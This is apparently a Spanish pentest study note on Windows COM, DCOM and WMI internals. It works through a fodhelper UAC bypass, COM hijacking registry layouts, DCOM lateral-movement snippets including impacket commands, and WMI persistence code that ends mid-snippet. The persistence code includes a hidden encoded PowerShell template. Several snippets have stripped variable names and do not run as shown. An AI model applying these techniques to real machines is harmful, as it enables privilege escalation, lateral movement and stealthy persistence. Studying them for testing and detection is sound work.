HRESULT CoInitializeSecurity(
    PSECURITY_DESCRIPTOR pSecDesc,  // NULL = usar default
    LONG cAuthSvc,                  // -1 = usar lista default
    SOLE_AUTHENTICATION_SERVICE *asAuthSvc,
    void *pReserved1,
    DWORD dwAuthnLevel,             // RPC_C_AUTHN_LEVEL_xxx
    DWORD dwImpLevel,               // RPC_C_IMP_LEVEL_xxx
    void *pAuthList,
    DWORD dwCapabilities,           // EOAC_xxx
    void *pReserved2
);

Si un servidor NO llama CoInitializeSecurity, COM usa valores por defecto:
- Auth level: CONNECT
- Imp level: IDENTIFY
- Authentication service: Negotiate (Kerberos o NTLM)

### Activation Security:
La seguridad que se aplica al CREAR un objeto COM (CoCreateInstance, CoGetClassObject).
Se controla con:
- LaunchPermission en el AppID (ACL).
- Machine-wide restrictions (en HKLM\SOFTWARE\Microsoft\COM3).

### Call Security:
La seguridad que se aplica a cada llamada a metodos del objeto.
Se controla con:
- AccessPermission en el AppID.
- El auth level del cliente al hacer el binding.

### Blanket (Security Blanket):
Es la configuracion de seguridad que se aplica a una llamada especifica. Se puede cambiar con CoSetProxyBlanket:

HRESULT CoSetProxyBlanket(
    IUnknown *pProxy,           // El [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) del objeto
    DWORD dwAuthnSvc,           // RPC_C_AUTHN_WINNT, KERBEROS, etc.
    DWORD dwAuthzSvc,           // RPC_C_AUTHZ_NONE
    OLECHAR *pServerPrincName,  // SPN (NULL para NTLM)
    DWORD dwAuthnLevel,         // RPC_C_AUTHN_LEVEL_xxx
    DWORD dwImpLevel,           // RPC_C_IMP_LEVEL_xxx
    RPC_AUTH_IDENTITY_HANDLE *pAuthInfo,  // credenciales
    DWORD dwCapabilities        // EOAC_xxx
);

Desde [powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell):
$obj = New-Object -ComObject Some.Application

### Implicaciones ofensivas:
- Si un servidor COM no configuro CoInitializeSecurity, podes llamarlo con [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) CONNECT (la mas debil).
- Si el LaunchPermission permite a Everyone o Users, cualquier usuario local puede instanciar el objeto.
- Podes cambiar el blanket para pasar credenciales alternativas.

---

## 2.8 Elevacion de privilegios via [com](../raw/w1n-s9bsyst3ms.md#com)

### [uac bypass](../raw/w1n-byp4ss3s.md#uac-bypass) via COM Elevation:
Desde Vista, Windows tiene UAC. Para elevar privilegios desde un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) no elevado, Windows proporciona un mecanismo COM especial: **COM Elevation Moniker**.

Elevation:Administrator!new:{CLSID}

El elevation moniker permite crear objetos COM que se ejecutan con privilegios elevados, incluso desde un proceso no elevado. El usuario ve un prompt de UAC (si no es administrador) o lo acepta silenciosamente (si es administrador con UAC en medio).

### CLSIDs elevables conocidos:
- {3E5FC7F9-9A51-4367-9063-A120244FBEC7} — CMSTPLUA (Microsoft Connection Manager)
- {08A0E5A0-179B-11D3-8C07-0000F81D7D4D} — UAC script host
- {3AD05575-8857-4850-9277-11B85BDB8E09} — ComputerManagement
- {D5E65222-76F1-4B2B-84D5-A90C68C8D348} — NetworkAdapterConfiguration
- Varios de mmc.exe, cleanmgr.exe, fodhelper.exe, etc.

### Como funciona:
1. El proceso no elevado construye un moniker: Elevation:Administrator!new:{CLSID}
2. COM Runtime detecta el moniker y lanza el servidor COM elevado.
3. Si el usuario es administrador (con UAC medio), se eleva sin prompt.
4. Si el usuario es usuario normal, aparece el prompt de UAC.

### Windows 10/11 FodHelper UAC Bypass:
New-Item -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Force
[set](../raw/ph1sh1ng.md#social-engineering-toolkit)-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(Default)" -Value "cmd.exe /c start notepad.exe"
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value ""

# Ejecutar fodhelper.exe (usa COM elevation)
C:\Windows\System32\fodhelper.exe

Esto funciona porque fodhelper.exe usa un CLSID elevable y el registry de HKCU tiene prioridad sobre HKLM.

---

## 2.9 [com](../raw/w1n-s9bsyst3ms.md#com) Hijacking para [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia)

El COM Hijacking es una tecnica de persistencia que explota como Windows busca servidores COM en el registry.

### Como funciona:
Cuando un programa (o el sistema) intenta crear un objeto COM con un CLSID, el runtime busca en:
1. HKCU\Software\Classes\CLSID\{CLSID} (usuario actual)
2. HKLM\Software\Classes\CLSID\{CLSID} (todo el sistema)

Si el CLSID no existe en el sistema, o si existe en HKLM pero el usuario puede escribir en HKCU, se puede registrar un servidor COM malicioso.

### Tipos de hijacking:

#### 1. CLSID inexistente:
Algunas aplicaciones intentan crear objetos COM que no estan registrados. Si registras ese CLSID en HKCU, ganas ejecucion cuando la app lo intente crear.

Ejemplo con InprocServer32:
HKCU\Software\Classes\CLSID\{FAKE-CLSID}\
  InprocServer32\
    (Default) = "C:\malware.dll"
    ThreadingModel = "Apartment"

#### 2. Reemplazo de CLSID existente:
Si tenes [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de escritura en HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32, podes cambiar el path de la DLL.

#### 3. TreatAs hijacking:
El valor TreatAs en un CLSID redirige la creacion de un objeto a otro CLSID.
HKCR\CLSID\{A-ORIGINAL}\TreatAs = "{B-MALICIOSO}"
Cuando alguien crea el objeto A, COM crea el objeto B en su lugar.

#### 4. AutoConvert:
Similar a TreatAs, pero para conversion de formato de archivos. Si abris un archivo de tipo X, COM crea el objeto B para manejarlo.

#### 5. Extension hijacking:
Cuando Windows explora ciertos tipos de archivos (.dll, .ocx, .py, etc.), el shell intenta crear objetos COM asociados a esos tipos.

### CLSIDs comunes para hijacking:
- **CLSID de Microsoft Office:** que intentan crear objetos al abrir documentos.
- **CLSID de Windows Shell:** que se ejecutan al explorar carpetas.
- **CLSID de proveedores [wmi](../raw/w1n-s9bsyst3ms.md#wmi):** para persistencia via [wmi](../raw/w1n-s9bsyst3ms.md#wmi).
- **CLSID de tareas programadas:** algunas tareas usan COM.

### Deteccion:
- Busca CLSIDs registrados en HKCU\Software\Classes\CLSID que no sean de Microsoft legitimos.
- Busca valores TreatAs y AutoConvert inusuales.
- Busca procesos que cargan DLLs desde paths inusuales.
# DCOM

## 3.1 ORPC — Object [rpc](../raw/w1n-s9bsyst3ms.md#rpc)

[dcom](../raw/w1n-s9bsyst3ms.md#dcom) extiende [com](../raw/w1n-s9bsyst3ms.md#com) para funcionar sobre la [red](../raw/r3d3s-f0nd4m3nt0s.md). En lugar de LRPC (local), usa **ORPC** (Object RPC), que es RPC con algunas extensiones para manejar objetos.

### Diferencias entre RPC y ORPC:
- **RPC:** Llamas una [funcion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#funciones) especifica en una interfaz. No hay estado entre llamadas.
- **ORPC:** Llamas un metodo en un objeto especifico. El objeto tiene estado entre llamadas.

### Como funciona:
1. El cliente crea (o recibe) una referencia a un objeto remoto.
2. Las llamadas a metodos se serializan via [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy)/stub.
3. El proxy empaqueta los parametros en una peticion ORPC.
4. La peticion viaja por RPC al servidor.
5. El stub desempaqueta y llama al objeto real.
6. El resultado viaja de vuelta.

### Identificacion de objetos:
Cada objeto DCOM tiene un **OID** (Object Identifier) unico (dentro del exportador). El par (OXID, OID) identifica univocamente un objeto en la red.

---

## 3.2 OXID Resolver

El **OXID Resolver** es un servicio que corre en cada maquina con [dcom](../raw/w1n-s9bsyst3ms.md#dcom). Es similar al EPM pero para objetos en lugar de interfaces.

### Funciones del OXID Resolver:
- Traducir (OXID, OID) a un string binding.
- Resolver referencias a objetos exportados.
- Manejar la comunicacion entre exportadores de objetos.

### OXID (Object Exporter Identifier):
Cada [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) que exporta objetos DCOM tiene un OXID unico. El OXID contiene:
- El string binding donde el proceso escucha.
- La informacion de [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion).
- El conjunto de interfaces que exporta.

### Proceso de resolucion:
1. El cliente tiene un OBJREF con un OXID y OID.
2. El cliente contacta al OXID Resolver del servidor (a traves de [rpc](../raw/w1n-s9bsyst3ms.md#rpc), interfaz IObjectExporter).
3. El OXID Resolver devuelve el string binding del exportador.
4. El cliente se conecta al exportador y puede invocar metodos en el objeto.

### Interfaz IObjectExporter:
UUID: 99FCFEC4-5260-101B-BBCB-00AA0021347A
Opnum 0: ResolveOxid
Opnum 1: SimplePing
Opnum 2: ComplexPing
Opnum 3: ServerAlive
Opnum 4: ResolveOxid2

### ResolveOxid2:
HRESULT ResolveOxid2(
    [in]  OXID  *pOxid,
    [in]  WORD  cRequestedProtseqs,
    [in]  WORD  arRequestedProtseqs[],
    [out] DUALSTRINGARRAY **ppdsaOxidBindings,
    [out] IPID  *pipidRemUnknown,
    [out] DWORD *pdwAuthnHint
);

Devuelve las direcciones donde el exportador esta escuchando.

---

## 3.3 OBJREF — Object Reference

Un **OBJREF** es la representacion serializada de una referencia a un objeto [com](../raw/w1n-s9bsyst3ms.md#com). Cuando pasas una interfaz [com](../raw/w1n-s9bsyst3ms.md#com) como parametro en una llamada [dcom](../raw/w1n-s9bsyst3ms.md#dcom), se serializa como un OBJREF.

### Tipos de OBJREF:

#### OBJREF_STANDARD:
La referencia a un objeto remoto. Contiene:
- **Signature:** 0x574f454d (es "MEOW" en ASCII si lo lees al reves. En realidad es por "Microsoft Extended Object Wire").
- **Flags:** Tipo de OBJREF
- **IID:** La interfaz referenciada
- **OXID:** El Object Exporter ID
- **OID:** El Object ID (dentro del exportador)
- **IPID:** El Interface Pointer ID (identifica la interfaz especifica)
- **Public Refs:** Contador de referencias publicas

#### OBJREF_HANDLER:
Para objetos que tienen un handler local (codigo que corre localmente, como un [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) personalizado). Similar a Standard pero con informacion del handler.

#### OBJREF_CUSTOM:
Para objetos con marshalling personalizado (implementan IMarshal). Contiene:
- CLSID del handler (que maneja el unmarshalling)
- Datos personalizados (dependen de la implementacion de IMarshal)

### Estructura binaria de OBJREF_STANDARD:
Offset 0:  DWORD signature = 0x574f454d  ("MEOW")
Offset 4:  DWORD flags     = 0x00000001  (STANDARD)
Offset 8:  GUID iid
Offset 24: OXID oxid
Offset 32: OID oid
Offset 40: IPID ipid
Offset 48: DWORD publicRefs

---

## 3.4 IClassFactory y RemoteCreateInstance

Para crear un objeto [com](../raw/w1n-s9bsyst3ms.md#com) remoto, el cliente no puede simplemente llamar CoCreateInstance(CLSID) localmente (porque la DLL esta en otra maquina). En su lugar, [dcom](../raw/w1n-s9bsyst3ms.md#dcom) sigue estos pasos:

### [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de creacion remota:

1. **Cliente** llama CoCreateInstanceEx o CoGetClassObject.
2. **Runtime COM** local detecta que el objeto es remoto (por la configuracion del AppID o porque se especifico COSERVERINFO).
3. **Runtime** se conecta al OXID Resolver del servidor ([tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) 135).
4. **Runtime** solicita una referencia a IClassFactory para el CLSID especificado.
5. **Servidor** crea el class factory y devuelve un OBJREF a IClassFactory.
6. **Cliente** llama IClassFactory::CreateInstance sobre el OBJREF remoto.
7. **Servidor** instancia el objeto y devuelve la referencia.

### IClassFactory:
interface IClassFactory : IUnknown {
    HRESULT CreateInstance(
        [in]  IUnknown *pUnkOuter,
        [in]  REFIID riid,
        [out] void **ppvObject
    );
    HRESULT LockServer(
        [in]  BOOL fLock
    );
}

### CoCreateInstanceEx:
HRESULT CoCreateInstanceEx(
    REFCLSID clsid,
    IUnknown *pUnkOuter,
    DWORD dwClsContext,
    COSERVERINFO *pServerInfo,  // Maquina remota, credenciales
    DWORD dwCount,
    MULTI_QI *pResults
);

COSERVERINFO contiene:
typedef struct _COSERVERINFO {
    DWORD dwReserved1;
    LPWSTR pwszName;           // Nombre del servidor remoto
    COAUTHINFO *pAuthInfo;     // Credenciales (usuario, dominio, password)
    DWORD dwReserved2;
} COSERVERINFO;

---

## 3.5 AppID, [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de launch y access

La seguridad de [dcom](../raw/w1n-s9bsyst3ms.md#dcom) se controla a traves de los **AppIDs** y las **restricciones machine-wide**.

### LaunchPermission:
Controla quien puede CREAR objetos de un servidor [com](../raw/w1n-s9bsyst3ms.md#com). Se almacena como un SECURITY_DESCRIPTOR binario en:
HKCR\AppID\{APPID}\LaunchPermission
Tambien hay un launch permission por defecto en:
HKLM\SOFTWARE\Microsoft\Ole\DefaultLaunchPermission

### AccessPermission:
Controla quien puede LLAMAR metodos en objetos ya creados.
HKCR\AppID\{APPID}\AccessPermission

### Machine-wide restrictions ([legacy](../raw/l3g4cy-3nt3rpr1s3.md)):
Antes de XP SP2, la seguridad DCOM era muy lava. A partir de XP SP2, se agregaron restricciones machine-wide en:
HKLM\SOFTWARE\Microsoft\Ole\MachineLaunchRestrictions
HKLM\SOFTWARE\Microsoft\Ole\MachineAccessRestrictions

Estas restricciones NO se pueden sobreescribir con configuraciones por AppID. Siempre se aplican primero.

### Estructura de MachineLaunchRestrictions:
HKLM\SOFTWARE\Microsoft\Ole\MachineLaunchRestrictions\
  S-1-1-0 (Everyone)\
    (default)  = (SDDL con permisos)
  S-1-5-32-544 (Administrators)\
    (default)  = (SDDL con permisos)
  S-1-5-18 (SYSTEM)\
    (default)  = (SDDL con permisos)

### Permisos tipicos:
- **Launch:** ANONYMOUS LOGON suele tener acceso de launch restringido.
- **Access:** ANONYMOUS LOGON suele tener acceso denegado a metodos.
- **Everyone:** Puede tener launch y access para CLSIDs especificos (como los de Windows Update, [wmi](../raw/w1n-s9bsyst3ms.md#wmi), etc.).

### Como ver los permisos:
 = "{00024500-0000-0000-C000-000000000046}"
Get-ItemProperty "HKCR:\AppID\" -Name LaunchPermission

---

## 3.6 Restricciones machine-wide de [dcom](../raw/w1n-s9bsyst3ms.md#dcom)

A partir de Windows XP SP2 y Windows Server 2003, Microsoft agrego restricciones **machine-wide** de DCOM que no pueden ser sobreescritas por los AppIDs. Esto fue en respuesta a gusanos como Blaster que explotaban DCOM sin restricciones.

### Location:
HKLM\SOFTWARE\Microsoft\Ole\MachineLaunchRestrictions
HKLM\SOFTWARE\Microsoft\Ole\MachineAccessRestrictions

### Policy:
Cada politica se define como un SDDL (Security Descriptor Definition Language) que contiene:
- **Default:** La ACL por defecto para todos los que no tienen entrada especifica.
- **SID-specific:** ACL para un SID especifico.

### Valores tipicos:
MachineLaunchRestrictions\S-1-1-0 (Everyone):
  Default: O:BAG:BAD:(A;;0x7;;;WD)(A;;0x3;;;AN)
  ([permisos](../raw/0s-f0nd4m3nt0s.md#permisos): Everyone=Launch, ANONYMOUS=Connect)

MachineAccessRestrictions\S-1-1-0 (Everyone):
  Default: O:BAG:BAD:(A;;0x3;;;WD)(A;;0x1;;;AN)
  (Permisos: Everyone=Access call, ANONYMOUS=Access call... limitado)

### Implicaciones:
- **ANONYMOUS LOGON** no puede lanzar ni acceder a la mayoria de los objetos DCOM en maquinas modernas.
- **Authenticated Users** tiene mas permisos pero aun restringido.
- Algunos CLSIDs especificos (como los de [wmi](../raw/w1n-s9bsyst3ms.md#wmi)) tienen excepciones.

### Como checkear restricciones:
 = "HKLM:\SOFTWARE\Microsoft\Ole"
Get-ItemProperty -Path  -Name MachineLaunchRestrictions
Get-ItemProperty -Path  -Name MachineAccessRestrictions

---

## 3.7 [dcom](../raw/w1n-s9bsyst3ms.md#dcom) y el [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls) de Windows

DCOM complica el firewall porque no usa puertos fijos. Los servidores DCOM pueden escuchar en cualquier [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) alto.

### Puertos dinamicos:
- **[tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) 135:** EPM / OXID Resolver (fijo, necesario).
- **TCP 49152–65535:** Puertos dinamicos para servidores DCOM (Windows Vista+).
- **TCP 1024–5000:** Puertos dinamicos en Windows XP/2003.

### [rpc](../raw/w1n-s9bsyst3ms.md#rpc) Dynamic Port Allocation:
Cuando un servidor DCOM se registra, pide al sistema un puerto dinamico:
RpcServerUseProtseqEp("ncacn_ip_tcp", 0, NULL); // NULL = puerto dinamico
RpcServerRegisterIf(...);
RpcEpRegister(...); // Asi lo encuentra el EPM

### Firewall rules necesarias para DCOM:
Para que DCOM funcione a traves del firewall de Windows:
1. **RemoteServiceManagement ([com](../raw/w1n-s9bsyst3ms.md#com)+):** Regla predefinida que permite DCOM + [wmi](../raw/w1n-s9bsyst3ms.md#wmi) + Service Control.
2. **RemoteVolumeManagement:** Para administracion remota de volumenes.
3. **RemoteEventLogSvc:** Para log de eventos remoto.

Si vas a hacer lateral movement con DCOM en un pentest, la maquina objetivo DEBE tener habilitada la regla Remote Service Management (o similar) para que DCOM funcione.

### Windows Defender Firewall + DCOM:
# Habilitar reglas de administracion remota:
Enable-NetFirewallRule -DisplayGroup "Remote Service Management"
Enable-NetFirewallRule -DisplayGroup "Remote Event Log Service Management"
Enable-NetFirewallRule -DisplayGroup "Remote Volume Management"

---

## 3.8 [dcom](../raw/w1n-s9bsyst3ms.md#dcom) Lateral Movement

El lateral movement con DCOM se basa en crear objetos [com](../raw/w1n-s9bsyst3ms.md#com) remotos que ejecuten codigo. La idea es instanciar una clase [com](../raw/w1n-s9bsyst3ms.md#com) en una maquina remota y llamar metodos que ejecuten comandos.

### MMC Application Class (CLSID={49B2791A-B1AE-4C90-9B8E-E860BA07F889}):
$Computer = "192.168.1.100"
$MMC = [activator]::CreateInstance([type]::GetTypeFromCLSID("49B2791A-B1AE-4C90-9B8E-E860BA07F889", ))
$MMC.Document.ActiveView.ExecuteShellCommand("cmd.exe", , "/c calc.exe", "7")

### ShellBrowserWindow:
$Computer = "192.168.1.100"
$Type = [type]::GetTypeFromProgID("Shell.Application", )
$Shell = [activator]::CreateInstance()
$Shell.ShellExecute("cmd.exe", "/c calc.exe")

### Excel Application Class (CLSID={00024500-0000-0000-C000-000000000046}):
$Computer = "192.168.1.100"
$Excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", ))
$Excel.DisplayAlerts = False

### DCOM con Impacket (dcomexec.py):
# Ejecutar comando via MMC
impacket-dcomexec DOMAIN/user:password@192.168.1.100

# Especificar objeto COM
impacket-dcomexec -object MMC20 DOMAIN/user:password@192.168.1.100
impacket-dcomexec -object ShellWindows DOMAIN/user:password@192.168.1.100
impacket-dcomexec -object Excel DOMAIN/user:password@192.168.1.100

### Requisitos para DCOM lateral movement:
1. Puertos: 135/[tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp) + [puerto](../raw/r3d3s-f0nd4m3nt0s.md#puertos) dinamico (>49152)
2. [firewall](../raw/s3c-f0nd4m3nt0s.md#firewalls): Remote Service Management habilitado
3. Auth: Usuario con [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de launch y access para el CLSID
4. Usuario debe ser administrador local (normalmente)
5. HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy = 1 (para cuentas locales)

---

# WMI

## 4.1 Arquitectura [wmi](../raw/w1n-s9bsyst3ms.md#wmi)

WMI (Windows Management Instrumentation) es la implementacion de Microsoft del estandar WBEM/CIM de la DMTF. WMI es una capa de gestion que permite consultar y modificar practicamente cualquier aspecto de Windows.

### Componentes:

**CIMOM (Common Information Model Object Manager):**
- Es el motor central de WMI.
- Implementado en wmiprvse.exe (proveedores) y WinMgmt.exe (el servicio).
- El servicio es Winmgmt (winmgmt).
- Las consultas WQL se procesan aqui.
- Se comunica con los proveedores a traves de interfaces [com](../raw/w1n-s9bsyst3ms.md#com).

**WMI Repository:**
- Base de datos que almacena las definiciones de clases WMI.
- Ubicacion: %SystemRoot%\System32\wbem\Repository\ (Windows 10+)
- Desde Windows 10, usa un motor de base de datos propio (Fast Repository o ESE).
- Las definiciones estaticas y las clases compiladas estan aqui.

**Proveedores (Providers):**
- DLLs COM que implementan clases WMI especificas.
- Se registran como __Win32Provider en el repository.
- Ejemplos: stdprov.dll (registry provider), cimwin32.dll (Win32 classes).

**WinMgmt Service:**
- Corre como svchost.exe -k netsvcs (Winmgmt).
- Arranca con el sistema, no se puede desactivar.
- Si se corrompe, Windows Update no funciona, el panel de control falla, etc.

### Flujo de una consulta WMI:
CLIENTE ([powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)/WMIC)
  -> COM (WbemScripting.SWbemLocator)
    -> WinMgmt (CIMOM)
      -> Proveedor (wmiprvse.exe)
        -> API nativa (registry, service control, etc.)

---

## 4.2 [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Providers

Los providers son el corazon de WMI. Cada provider implementa una o mas clases WMI.

### Registry Provider (stdprov.dll):
- Clases: StdRegProv
- Metodos: EnumKey, EnumValues, GetStringValue, SetDWORDValue, CreateKey, DeleteKey, etc.
- Namespace: root\default

Get-WmiObject -Namespace root\default -Class StdRegProv

### Process Provider (cimwin32.dll):
- Clases: Win32_Process
- Metodos: Create, Terminate, GetOwner, GetAvailableVirtualMemory, etc.
- Namespace: root\cimv2

### Service Provider (cimwin32.dll):
- Clases: Win32_Service, Win32_BaseService
- Metodos: StartService, StopService, Change, Create
- Namespace: root\cimv2

### Event Log Provider (wbemcore.dll):
- Clases: Win32_NTLogEvent, Win32_NTEventlogFile
- Permite leer y borrar logs de eventos.
- Namespace: root\cimv2

### Registry Event Provider (stdprov.dll):
- Clases: RegistryKeyChangeEvent, RegistryValueChangeEvent, RegistryTreeChangeEvent
- Permite monitorear cambios en el registry.
- Namespace: root\default

### Security Provider (cimwin32.dll):
- Clases: Win32_SecuritySetting, Win32_LogicalFileSecuritySetting, Win32_LogicalShareSecuritySetting
- Permite leer ACLs de archivos, shares, registry.
- Namespace: root\cimv2

### Software Licensing Provider (sppwmi.dll):
- Clases: SoftwareLicensingProduct, SoftwareLicensingService
- Namespace: root\license

### [active directory](../raw/w1nd0ws-d0m41n-4dm1n.md) Provider:
- Clases: Win32_Directory, Win32_Group, Win32_UserAccount, Win32_ComputerSystem
- Namespace: root\directory\LDAP

### Otros providers utiles:
| Provider | Namespace | Que hace |
|----------|-----------|----------|
| MSFT_MpComputerStatus | root\Microsoft\Windows\Defender | Status de Defender |
| Win32_Product | root\cimv2 | Productos instalados (lento) |
| Win32_QuickFixEngineering | root\cimv2 | Parches de seguridad |
| Win32_StartupCommand | root\cimv2 | Programas en startup |
| Win32_NetworkAdapterConfiguration | root\cimv2 | Configuracion de [red](../raw/r3d3s-f0nd4m3nt0s.md) |
| AntiVirusProduct | root\SecurityCenter2 | Productos antivirus |

---

## 4.3 Jerarquia de namespaces [wmi](../raw/w1n-s9bsyst3ms.md#wmi)

WMI organiza las clases en **namespaces** (jerarquia similar a archivos). Cada namespace agrupa clases relacionadas.

### Namespaces principales:

| Namespace | Proposito | Clases clave |
|-----------|-----------|-------------|
| root\cimv2 | El principal. Casi todo lo de gestion de sistemas. | Win32_* |
| root\default | Registry provider, clases de sistema. | StdRegProv |
| root\security | WMI security settings. | __* (clases del sistema) |
| root\SecurityCenter2 | Security Center (Vista+). | AntiVirusProduct, FirewallProduct |
| root\Microsoft\Windows\Defender | Windows Defender. | MSFT_Mp* |
| root\Microsoft\Windows\[smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) | [smb](../raw/w1nd0ws-p0st3xpl01t.md#smb) settings. | MSFT_SmbShare |
| root\Microsoft\Windows\Storage | Storage spaces, disks. | MSFT_Volume, MSFT_Disk |
| root\ccm | SCCM (Configuration Manager). | SMS_* |
| root\RSOP | Resultant [set](../raw/ph1sh1ng.md#social-engineering-toolkit) of Policy. | RSOP_Policy* |
| root\subscription | WMI event subscriptions. | __EventFilter, __EventConsumer |
| root\aspnet | ASP.NET hosting. | ASPNET_* |
| root\WebAdministration | IIS management. | Site, AppPool |
| root\Hardware | Hardware inventory (Dell/HP tools). | * |

### Como listar namespaces:
Get-WmiObject -Namespace root -Class __NAMESPACE | Select-Object Name

O recursivamente:
function Get-WmiNS {
    param(="root")
    try {
        Get-WmiObject -Namespace  -Class __NAMESPACE | ForEach-Object {
             = "\"
            
            Get-WmiNS 
        }
    } catch {}
}
Get-WmiNS

---

## 4.4 WQL — [wmi](../raw/w1n-s9bsyst3ms.md#wmi) Query Language

WQL (WMI Query Language) es un subconjunto de SQL-92 usado para consultar objetos WMI.

### SELECT basico:
SELECT * FROM Win32_Process
SELECT Name, ProcessId, ExecutablePath FROM Win32_Process
SELECT * FROM Win32_Process WHERE Name = 'explorer.exe'
SELECT * FROM Win32_Service WHERE State = 'Running'
SELECT * FROM Win32_LogicalDisk WHERE DriveType = 3
SELECT * FROM Win32_ComputerSystem

### Operadores:
- =, <, >, <=, >=, <>
- LIKE (con % wildcard estilo SQL)
- IS, IS NOT (para NULL)
- AND, OR, NOT

SELECT * FROM Win32_Process WHERE Name LIKE '%cmd%' OR Name LIKE '%[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell)%'
SELECT * FROM Win32_NTLogEvent WHERE LogFile = 'Security' AND EventType = 4625
SELECT * FROM Win32_QuickFixEngineering WHERE HotFixID LIKE 'KB50%'

### ASSOCIATORS OF:
Busca objetos relacionados. Por ejemplo, los procesos que pertenecen a un usuario:
ASSOCIATORS OF {Win32_ComputerSystem.Name='PC'}
SELECT * FROM ASSOCIATORS OF {Win32_Process.Handle=1234} WHERE ClassDefsOnly

### REFERENCES OF:
Busca las relaciones entre objetos:
REFERENCES OF {Win32_Service.Name='Spooler'}

### ISA:
Filtra por herencia de clases:
SELECT * FROM meta_class WHERE __Class ISA 'CIM_Process'

### Event WQL:
SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'
Esto crea un evento que se dispara cada 5 segundos cuando se crea un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos).

### Limitaciones de WQL:
- NO tiene JOIN (no se pueden unir tablas).
- NO tiene ORDER BY.
- NO tiene GROUP BY ni funciones de agregacion (COUNT, SUM).
- NO tiene subconsultas.
- Los resultados de ASSOCIATORS OF y REFERENCES OF son limitados.

---

## 4.5 Event Subscriptions en [wmi](../raw/w1n-s9bsyst3ms.md#wmi)

WMI permite registrar **event subscriptions** que ejecutan codigo cuando ocurre un evento especifico.

### Componentes de una suscripcion:

1. **__EventFilter:** Define el evento que queremos capturar (WQL).
2. **__EventConsumer:** Define la accion a ejecutar cuando ocurre el evento.
3. **__FilterToConsumerBinding:** Vincula el filtro con el consumer.

### Tipos de eventos:
- **__InstanceCreationEvent:** Cuando se crea una instancia (ej. un [proceso](../raw/0s-f0nd4m3nt0s.md#procesos)).
- **__InstanceModificationEvent:** Cuando se modifica una instancia.
- **__InstanceDeletionEvent:** Cuando se elimina una instancia.
- **__TimerEvent:** Evento temporizado.
- **RegistryKeyChangeEvent:** Cambio en una clave de registry.
- **RegistryValueChangeEvent:** Cambio en un valor de registry.

### Tipos de event consumers estandar:

| Consumer | Clase | Que hace |
|----------|-------|----------|
| ActiveScriptEventConsumer | ActiveScriptEventConsumer | Ejecuta script (JScript/VBScript). No disponible desde Win8+ |
| CommandLineEventConsumer | CommandLineEventConsumer | Ejecuta un comando |
| LogFileEventConsumer | LogFileEventConsumer | Escribe en un archivo de log |
| NTEventLogEventConsumer | NTEventLogEventConsumer | Escribe en el Event Log de Windows |
| SMTPEventConsumer | SMTPEventConsumer | Envia un mail |

### CommandLineEventConsumer (el mas util):
# Crear filtro: evento cada 60 segundos
 = [set](../raw/ph1sh1ng.md#social-engineering-toolkit)-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "PersistFilter"
    EventNameSpace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __TimerEvent WHERE TimerID = 'PersistTimer'"
}

# Crear timer
 = Set-WmiInstance -Namespace root\cimv2 -Class __TimerInstruction -Arguments @{
    TimerId = "PersistTimer"
    IntervalBetweenEvents = 60000  # 60 segundos
    SkipIfPassed = False
}

# Crear consumer que ejecuta un comando
 = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "PersistConsumer"
    CommandLineTemplate = "C:\Windows\System32\calc.exe"
}

# Vincular
 = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = 
    Consumer = 
}

---

## 4.6 [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) via [wmi](../raw/w1n-s9bsyst3ms.md#wmi)

WMI event subscriptions son una tecnica de persistencia extremadamente poderosa y dificil de detectar.

### Ventajas:
- Corre en el contexto de wmiprvse.exe (Sistema o servicio).
- No crea archivos en el sistema (todo en repository WMI).
- No crea entradas de registro de startup (Task Manager no lo muestra).
- No hay procesos hijos visibles en algunos casos.
- Sobrevive a reinicios (las suscripciones persistentes se almacenan en el repository).

### Desventajas:
- Puede ser detectado por herramientas como Autoruns (Sysinternals).
- Si el repository WMI se corrompe, la suscripcion muere.
- Requiere [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) administrativos para crear suscripciones.

### Tipos de persistencia WMI:

#### 1. Temporizador (TimerEvent):
Ejecuta codigo cada X segundos:
 = "UpdaterTimer"
 = "UpdaterFilter"
 = "UpdaterConsumer"
 = "[powerShell](../raw/w1nd0ws-p0st3xpl01t.md#powershell).exe -NoP -W Hidden -Exec Bypass -Enc <base64>"

[set](../raw/ph1sh1ng.md#social-engineering-toolkit)-WmiInstance -Namespace root\cimv2 -Class __TimerInstruction -Arguments @{
    TimerId = 
    IntervalBetweenEvents = 300000  # 5 minutos
